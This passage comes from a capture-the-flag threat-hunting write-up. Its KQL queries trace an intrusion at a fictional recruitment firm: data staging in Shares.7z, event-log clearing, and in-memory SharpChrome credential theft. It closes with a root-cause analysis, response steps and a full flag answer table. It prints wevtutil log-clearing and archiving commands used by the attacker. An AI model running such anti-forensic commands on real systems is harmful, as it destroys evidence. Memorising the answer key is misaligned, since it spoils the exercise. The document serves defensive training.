| where FileName =~ "BACS_Payments_Dec2025.ods"
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessFileName, SHA256
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `as-pc2`

</details>

#### 🚩Flag 35: Exfil Archive
**Question**: Data was arhcived before potential exfiltration. What is the archive filename?

Telemetry shows the creation of the archive `Shares.7z` on host `AS-SRV`: 

Observed Command line: 
```cmd 
"7zG.exe" a -i#7zMap308:22:7zEvent6071 -t7z -sae -- "C:\Shares.7z"
```

Shortly afterward, the archive was renamed and moved into the shared directory by `as.srv.administrator`:
```cmd
C:\Shares\Clients\Shares.7z
```

This activity suggests the attacker had already located sensitive files and was staging them for potential data exfiltration

**KQL query used**: 
```KQL
DeviceFileEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName startswith "as-"
| where FileName has_any (".7z", ".zip", ".tar", ".rar")
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessFileName, SHA256
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `Shares.7z`

</details>
#### 🚩Flag 36: Archive Hash
**Question**: What is the filehash?

**KQL query used**: 
```KQL
DeviceFileEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName startswith "as-"
| where FileName has_any (".7z", ".zip", ".tar", ".rar")
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessFileName, SHA256
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `6886c0a2e59792e69df94d2cf6ae62c2364fda50a23ab44317548895020ab048`

</details>

### Section 9: Anti-forensics & Memory
> Before leaving, the attacker tried to cover their tracks. Logs were cleared, binaries renamed, and tools loaded in ways designed to avoid detection. Identify the anti-forensics techniques and what evidence survived.
#### 🚩Flag 37: Log Clearing
**Question**: Name any two logs that were cleared

The attacker cleared multiple Windows event logs using `wevtutil`:
```cmd
wevtutil.exe cl Security
wevtutil.exe cl System
wevtutil.exe cl Application
wevtutil.exe cl "Windows PowerShell"
```

These actions were done on both `AS-PC1` by `sophie.turner` and `AS-SRV` as `as.srv.administrator`. This suggests the attacker attempted to remove forensic evidence from both the initial workstation and the file server after completing their objectives

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where ProcessCommandLine contains "wevtutil"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `Security, System`

</details>

#### 🚩Flag 38: Reflective Loading
**Question**: Evidence of reflective code loading was captured. What ActionType recorded this activity?

The Defender event `ClrUnbackedModuleLoaded` indicates that a .NET module was loaded into memory without a backing file on disk. This behavior commonly occurs when malicious code is:
- injected directly into memory
- reflectively loaded    
- executed without writing a binary to disk

The telemetry shows:
`Daniel_Richardson_CV.pdf.exe` created remote thread in `notepad.exe`

**KQL query used**: 
```KQL
DeviceEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| summarize Count = count() by ActionType
```

```KQL
DeviceEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where ActionType == "ClrUnbackedModuleLoaded"
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `ClrUnbackedModuleLoaded`

</details>

#### 🚩Flag 39: Memory Tool
**Question**: A credential theft tool was loaded directly into memory. What tool was used?

Analysis of the reflective module loading event identified the tool **SharpChrome**. SharpChrome is an open-source credential harvesting tool designed to extract saved credentials from Chromium-based browsers.

Running the tool **directly in memory** allowed the attacker to steal credentials without writing the executable to disk. 

**KQL query used**: 
```KQL
DeviceEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where ActionType == "ClrUnbackedModuleLoaded"
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath, AdditionalFields
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `SharpChrome`

</details>

#### 🚩Flag 40: Host Process
**Question**: What process was hosting the malicious assembly?

The malicious .NET assembly was executed within the legitimate Windows process `notepad.exe`

**KQL query used**: 
```KQL
DeviceEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where ActionType == "ClrUnbackedModuleLoaded"
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath, AdditionalFields
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `notepad.exe`

</details>
## Root Cause Analysis

The root cause of this incident was the execution of a malicious file disguised as a legitimate resume document, `daniel_richardson_cv.pdf.exe`, on workstation `AS-PC1`. The file used a double extension to appear as a normal PDF, increasing the likelihood that the user would trust and open it.

Endpoint logs show the file was launched by `explorer.exe`, confirming that the malware was manually executed by a user rather than triggered by an automated process. This indicates the attacker’s initial access relied on social engineering and user execution.

The incident was made possible by insufficient controls to prevent a disguised executable from being trusted and launched by a user. The attacker relied on a double-extension file to make the payload appear to be a legitimate document, indicating gaps in file extension visibility, application control, and user awareness defenses. Preventive controls such as displaying full file extensions, blocking execution of unapproved binaries, restricting execution from common user-writable locations, and more aggressively screening suspicious attachments should have reduced the likelihood of successful execution.

## Threat Actor Timeline

## Immediate Response
Malicious activity has been confirmed. The following containment and remediation actions should be performed

1. Immediately isolate the compromised systems from the network:
	1. `AS-PC1`
	2. `AS-PC2`
	3. `AS-SRV`

2. Disable the following compromised or unauthorized accounts:
	1. sophie.turner
	2. david.mitchell
	3. svc_backup
	4. as.srv.administrator

3. Reset Credentials of all compromised users and privileged accounts
   
4. Remove persistence mechanisms
	1. Delete scheudled tasks `MicrosoftEdgeUpdateCheck`
	2. Remove `RunTimeBroker.exe` from `C:\Users\Public`
	3. Uninstall `Anydesk.exe`
	   
5. Block malicious domains
	1. `cdn.cloud-endpoint.net`
	2. `sync.cloud-endpoint.net`
## Business Impact

### Shareholders
The compromise of multiple internal systems poses a significant risk to Ashford Sterling Recruitment’s operational stability, reputation, and financial standing. If not fully contained, this intrusion could lead to financial loss, additional data exposure, and business disruption, which may reduce stakeholder confidence in the organization’s ability to protect critical assets and maintain long-term stability.
### Business Partners
The attacker accessed sensitive data stored on the internal file server, including information that likely contained financial or payment-related records. Exposure of this data could negatively affect trust between Ashford Sterling Recruitment and its business partners, particularly if payment records, transaction details, or other commercially sensitive information were exposed or misused.
### Employees
The attacker extracted credential material by dumping registry hives and later executed a browser credential harvesting tool. Additionally, the attacker was able to move laterally within the environment using valid user accounts. These actions increase the risk of account misuse, unauthorized access, and impersonation attempts against employees. If affected users reused the same or similar passwords across personal and work-related accounts, the compromise could also increase the risk of unauthorized access to personal services such as email, banking, or social media accounts.
### Customers
Currently, there is no direct evidence that customer-facing systems or customer data. However, customers may face indirect impacts such as fraud attempts, impersonation, or loss of trust in the organization for failing to safeguard sensitive information. Continued monitoring and containment efforts are necessary to reduce the likelihood of customer impact. 

## Appendix A: Indicators of Compromise (IOCs)

## Appendix B: MITRE ATT&CK Mapping

## Appendix C: CTF Flags

| **Flag** | **Question**                                                                                                       | **Answer**                                                         |
| -------- | ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------ |
| 1        | Identify the file that started the infection chain                                                                 | `Daniel_Richardson_CV.pdf.exe`                                     |
| 2        | Identify the SHA256 hash of the initial payload                                                                    | `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5` |
| 3        | What parent process indicates the method of execution?                                                             | `explorer.exe`                                                     |
| 4        | What legitimate Windows process was spawned?                                                                       | `notepad.exe`                                                      |
| 5        | The spawned process executed with unusual arguments. What was the full command line?                               | `notepad.exe ""`                                                   |
| 6        | What domain was used for command and control?                                                                      | `cdn.cloud-endpoint.net`                                           |
| 7        | What process initiated the outbound connections?                                                                   | `daniel_richardson_cv.pdf.exe`                                     |
| 8        | WHat domain was used for payload staging?                                                                          | `sync.cloud-endpoint.net`                                          |
| 9        | What two registry hives were targeted?                                                                             | `SAM, SYSTEM`                                                      |
| 10       | Where were the credential files saved?                                                                             | `C:\Users\Public`                                                  |
| 11       | Credential execution was performed under a specific user context. What user performed this action?                 | `sophie.turner`                                                    |
| 12       | The attacker confirmed their identity after initial access. What command was used?                                 | `whoami.exe`                                                       |
| 13       | The attacker enumerated network resources. What command was used to view available shares?                         | `net.exe view`                                                     |
| 14       | The attacker enumerated privileged local group membership. What group was queried?                                 | `administrators`                                                   |
| 15       | A legitimate remote administration tool was deployed for ongoing access. What software was installed?              | `Anydesk`                                                          |
| 16       | Identify the SHA256 hash of the remote access tool                                                                 | `f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532` |
| 17       | The tool was downlaoded using a native Windows binary. What binary/executbale was used?                            | `certutil`                                                         |
| 18       | After installation, a configuration file was accessed. What is the full path of this file?                         | `C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf`       |
| 19       | Unattended access was configured for the remote tool. What password was set?                                       | `intrud3r!`                                                        |
| 20       | The remote tool was installed across the environment. List all hostnames where it was deployed.                    | `AS-PC1, AS-PC2, AS-SRV`                                           |
| 21       | The attacker attempted remote execution methods that failed. What two tools were tried?                            | `WMIC.exe`, `PsExec.exe`                                           |
| 22       | What hostname was targeted in the failed attempts?                                                                 | `AS-PC2`                                                           |
| 23       | After failed attempts, a different method achieved lateral movement. What executable was used?                     | `mstsc.exe`                                                        |
| 24       | The attacker moved through the environment in a specific sequence. What is the full lateral movement path?         | `as-pc1 > as-pc2 > as-srv`                                         |
| 25       | What username authenticated successfully?                                                                          | `david.mitchell`                                                   |
| 26       | A disabled account was enabled for further access. What net.exe parameter was used to activate the account?        | `/active:yes`                                                      |
| 27       | The account activation performed by a specific user. Who performed this action?                                    | `david.mitchell`                                                   |
| 28       | A scheduled task was created for persistence. What is the task name?                                               | `MicrosoftEdgeUpdateCheck`                                         |
| 29       | The persistence payload was renamed to avoid detection. What filename was used?                                    | `RuntimeBroker.exe`                                                |
| 30       | The persistence payload shares a hash with another file in this investigation. What is the SHA256 hash?            | `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5` |
| 31       | A new local account was created for future access. What is the username?                                           | `svc_backup`                                                       |
| 32       | A sensitive document was accessed on the file server. What is the filename?                                        | `BACS_Payments_Dec2025.ods`                                        |
| 33       | The document was opened for editing, not just viewing. What file artifact proves this?                             | `~lock.BACS_Payments_Dec2025.ods#`                                 |
| 34       | Which hostname accessed this file?                                                                                 | `as-pc2`                                                           |
| 35       | What is the archive filename?                                                                                      | `Shares.7z`                                                        |
| 36       | What is the file's SHA256 hash?                                                                                    | `6886c0a2e59792e69df94d2cf6ae62c2364fda50a23ab44317548895020ab048` |
| 37       | Name any two logs that were cleared                                                                                | `Security, System`                                                 |
| 38       | Evidence of reflective code loading was captured. What ActionType recorded this activity?                          | `ClrUnbackedModuleLoaded`                                          |
| 39       | A credential theft tool was loaded directly into memory. What tool was used?                                       | `SharpChrome`                                                      |
| 40       | The credential theft tool was injected into a legitimate process. What process was hosting the malicious assembly? | `notepad.exe`                                                      |
